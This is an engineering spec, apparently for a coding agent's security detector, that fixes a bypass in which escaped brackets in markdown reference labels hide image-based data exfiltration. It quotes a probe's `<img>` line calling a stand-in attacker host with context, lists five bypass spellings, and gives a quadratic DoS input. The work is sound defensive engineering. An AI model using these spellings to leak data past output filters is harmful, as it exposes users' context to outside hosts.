# T83 — spec: close T82#F-001 (a backslash-escaped `]` in a reference label hides the definition)

Scope, verbatim from the dispatch: the one finding that fires the `RESIDUALS.md` exception — blocker,
reproduced at a public boundary — and nothing else. Files I may touch:
`src/security/detect/exfil.ts`, `src/security/detect/exfil.test.ts`, and the auto-fetch subsection of
`docs/requirements/keryx-agent-first-core/policies.md` **only if** my change makes its current wording
untrue. T82#F-002..F-005 are documentation-grade and are not re-opened.

## Baseline, measured before any edit (this tree, `codex/agent-first-core`)

Four reviewer probes run unmodified. Raw:
`.metaproject/data/gdctx/raw/T83-before-T82-{escape,cost,dup,boundary}.log`.

`T82-escape`: `bypasses: [s01EscapedClose, s02EscapedCloseShort, s03EscapedCloseFull,
s04EscapedCloseCollapsed, s05TwoEscapedCloses]` — each `detectorFindings: 0`, `mcpState: "none"`,
all four boundary flags `true`, `marked` emitting `<img src="https://attacker.invalid/p?ctx=CTX">`.
The finding reproduces exactly as recorded.

## The defect, restated at the level the repair has to work at

`REFERENCE_DEF = /^[ \t]*\[([^\]]+)\]:\s*(?:<([^<>\n]*)>|(\S+))/gm`.

Because `[^\]]+` cannot cross a `]`, the `]` the pattern matches is always the **first** `]` after the
opening bracket, and the line matches only when that first `]` is immediately followed by `:`. A
definition whose label carries a backslash-escaped `]` — `[foo\]]: URL` — therefore matches **nothing**:
the first `]` is followed by another `]`. `refs` stays empty, `refs.size > 0` gates the whole reference
pass off, and the document produces zero findings while `marked` fetches.

The *use* side is not the problem. For `![foo\]]` the detector's candidate label span already runs from
`[`+1 to the first `]`, i.e. the raw bytes `foo\`. Every one of the five reachable spellings produces
that same span (verified by hand against `descriptionEnds` / `readBracketConstructs`, and to be pinned
by probe). What is missing is a table key equal to it.

## The two alternatives, weighed on cost and false positives

**(A) Full escape handling — teach both sides CommonMark's escape rule.** The definition capture admits
`\]`, and `descriptionEnds` gains a third candidate end at the first *unescaped* `]`. This is the
faithful reading, and it is the expensive one: a third candidate span per opening bracket directly
attacks the disjointness argument (three spans per open instead of two, and an escape-aware end can sit
past a `]` that another span's end sits on, so two spans can share bytes). It also changes the *use*
side, which the file's own header at `:529-531` forbids in the release direction — honouring `\]` there
would remove `![a\](URL)`, which is flagged today.

**(B) Over-approximate at the definition site — treat a definition-shaped line as a definition whatever
its label contains.** Cheap, no new candidate spans, but as stated it flags a definition's URL with no
resolving use at all, which is a much wider false-positive surface than the defect: every
`[a\]b]: https://example.org/x` in a quoted document becomes a masked URL whether or not anything
points at it.

**What I will implement is (B) narrowed until it is as faithful as (A) on every spelling that reaches a
renderer, at (B)'s cost.** The key insight is that the use side already produces `foo\` — the raw label
bytes up to the first `]`. So the definition site registers **exactly that**: the label read
escape-aware (so the line is recognised at all), then truncated at its first `]` (so the key is the
byte string the use side will hand to `readLabel`).

- Faithful where it matters: all five reviewer spellings, plus leading-escape, whitespace-collapsing,
  angle-destination, next-line-destination, case-folding and escaped-backslash-then-escaped-`]`
  variants, resolve and are flagged.
- False positives, enumerated rather than hand-waved: two labels that differ only *after* their first
  `]` collide (`[a\]b]: X` and a use `![a\]c]`). Both must contain a backslash escape inside a bracket
  run for the collision to exist. Cost is one extra masked URL, the same direction and the same remedy
  (allowlist) as the duplicate-definition over-approximation T81 already ships. To be measured on the
  benign corpus, not asserted.
- No release is possible: the change only ever **adds** table entries, so `matches` can only grow.

## What this does to the disjointness argument — the question asked first, answered first

T81's argument is: (i) no key can contain `]`, because the capture is `[^\]]+`; (ii) `normaliseLabel`
neither adds nor removes a `]`; so `readLabel` may reject any span containing `]` as a *necessary*
condition; (iii) with the `[` threshold at its ordinary 0 a surviving span carries no bracket at all, so
the `[` opening it is the last `[` before the `]` closing it, no two spans share an endpoint, the spans
are pairwise disjoint, and their total length is at most `content.length`.

**The argument survives, and step (iii) is untouched.** Only step (i)'s *reason* changes:

> A key is the label's bytes **up to its first `]`**, so no key can contain `]` — by construction of
> the truncation rather than by the negated character class of a regex.

That is a stronger statement than the one it replaces: it holds for every label the scanner recognises,
escape-aware or not, and it does not depend on any pattern. (ii) and (iii) then follow unchanged, and so
does the reviewer's tighter form — total candidate span length ≤ `(maxOpenBrackets + 1) × content.length`
with no budget at all — because that form depends only on `maxOpenBrackets`, which this change computes
from the same keys by the same loop.

I will pin (i) rather than assert it: a fuzz over generated definition lines asserting no key produced
by the scanner contains `]`, and asserting `maxLabelOpenBrackets` equals the true maximum.

## The mechanism, and the pre-existing cost defect it has to avoid compounding

Measured before any edit, driving `detectExfil` directly (raw: `T83-refdef-quadratic.log`):

| shape | bytes | ms |
|---|---|---|
| `"[aaaaaaaaa\n".repeat(4000)` | 44 000 | 96.7 |
| … `.repeat(8000)` | 88 000 | 361.9 |
| … `.repeat(16000)` | 176 000 | **1 431.9** |
| … `.repeat(32000)` | 352 000 | **5 899.3** |

`REFERENCE_DEF` is **already quadratic**, at HEAD, on a document with many line-start `[` and no `]`:
`[^\]]+` crosses newlines, so every line-start `[` scans to end-of-content and backtracks, once per
line. Ten review rounds missed it because every adversarial shape any of them built contained a `]`.
This is not my finding to fix under the scope decision, but it is decisive for **how** I implement the
repair: adding a second escape-aware regex pass measures 762–1 849 ms on the same shape on top of the
existing 1 432 ms, i.e. it would roughly double a live denial of service in the mandatory floor.

So the repair is **not** a second pattern. `REFERENCE_DEF`'s regex scan is replaced by one hand-written
linear scanner that reproduces its matches exactly and adds the escape-aware reading:

1. Enumerate line starts (index 0 and every position after `\n`, `\r`, ` `, ` ` — the
   positions JS `^` matches under `m`). Skip `[ \t]*`, require `[`.
2. Build, once, in one O(n) left-to-right pass gated behind step 1 finding anything at all: the
   ascending positions of every `]`, and of every `]` **not** preceded by an odd run of `\`.
3. Per line-start `[`, binary-search the first `]` at or after it. If that `]` is followed by `:` the
   line reads exactly as `REFERENCE_DEF` reads it today — same key, same destination sub-pattern
   (`\s*(?:<([^<>\n]*)>|(\S+))`, sticky), same URL, same offset. If it is **escaped**, fall through to
   the first *unescaped* `]` and require `:` there; the key is still the prefix before the first `]`.
4. Replicate `g`/`lastIndex`: after a successful read, skip every line start before the match end.

Why (3)'s first branch is exactly today's behaviour: `[^\]]+` cannot cross `]`, so the `]` it matches is
always the first one, and backtracking can only shorten the capture — which then needs a `]` earlier
than the first, which does not exist. The match therefore succeeds **iff** the first `]` after the
opening bracket is at distance ≥ 1 and is followed by `:` and a destination. That is precisely the test
in (3).

Cost of the scanner: one O(n) pass, plus O(log n) per line-start `[`. No backtracking anywhere. The
quadratic above disappears as a consequence; that is a side effect of the mechanism, reported with
numbers, not a second repair.

## Tests (RED first), in `src/security/detect/exfil.test.ts`

Each written to fail on the current tree:

- `T83#F-001` — every escape spelling at the detector **and** at all four public boundaries
  (`dispatchCallTool`, `prepareOutputForPersistence`, `validateOutputForTransport`, `redactToolOutput`),
  closing T82#F-002's durability gap for the new rows while I am here:
  the reviewer's five, plus mine — leading escape `![\]]`, whitespace-collapsing `![foo\]  bar]`,
  angle destination, next-line destination, upper-case use against lower-case definition, an escaped
  backslash before an escaped bracket (`![a\\\]]`), an escaped backslash before a real bracket
  (`![a\\]`, closed today, must stay closed), and a label carrying both an escaped and an unescaped
  bracket (`![a\]b[c]`, `![a\][b]` — `marked` renders **no** image for either, because CommonMark
  forbids an unescaped `[` inside a label, so these are asserted as *not fetched* rather than as
  findings).
- `T83#F-001` (no-release direction) — `[foo\]: URL`, which today's pattern matches as key `foo\` and
  which renders no image, must **stay** a table entry; the floor may not move in the release direction.
- `T83#F-001` (structural property) — a fuzz over generated definition lines asserting that no key the
  scanner produces contains `]`, which is step (i) of the disjointness argument.
- `T83#F-001` (cost) — the definition-scan shape above under the same 500 ms budget the existing perf
  tests use.
- Non-regression: everything T77/T78/T81 pinned stays green, and the duplicate-definition tests are
  untouched.

## Verification to report

Four reviewer probes before/after; all 19 prior matrices before/after by hash against T81's and T82's
recorded tables; a differential fuzz of the new scanner against the literal old regex; a cost table over
T81's and T82's adversarial shapes plus mine (the definition-scan shape, an escape-dense shape, and a
backslash-dense shape) with exponents and a constant-size dial sweep; the benign corpus count; `bun test`
on the four focused suites; `bun run typecheck`; `bunx eslint` on every changed file.
